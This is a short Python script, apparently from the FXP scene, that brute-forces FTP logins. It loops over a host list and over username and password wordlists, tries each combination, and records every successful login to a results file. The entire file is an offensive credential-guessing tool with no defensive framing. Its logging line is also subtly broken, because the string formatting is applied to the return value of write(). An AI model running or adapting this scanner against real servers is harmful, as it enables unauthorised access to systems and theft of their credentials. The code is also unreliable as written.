"""
Anonymous FTP Scanner 4 FXP-TERMiNAL.iNFO
by SpliTerZ.tw!XX
"""
import ftplib
import sys

def scan(hostlist):
    users = open('users.txt','r').read().splitlines()
    passwords = open('passwords.txt','r').read().splitlines()
    hostlist = sys.argv[1]
    hosts = open(hostlist,'r').read().splitlines()
    for host in hosts:
        for user in users:
            for password in passwords:
                try:
                    connection = ftplib.FTP(host)        
                    if '230' in connection.login(user=user,passwd=password):
                        logfile = open('results.txt','a')
                        logfile.write(host+" User: %s Password: %s \n") % (user,password)
                        logfile.close()
                        connection.quit()        
                except ftplib.all_errors:
                    pass
        
scan(sys.argv[1])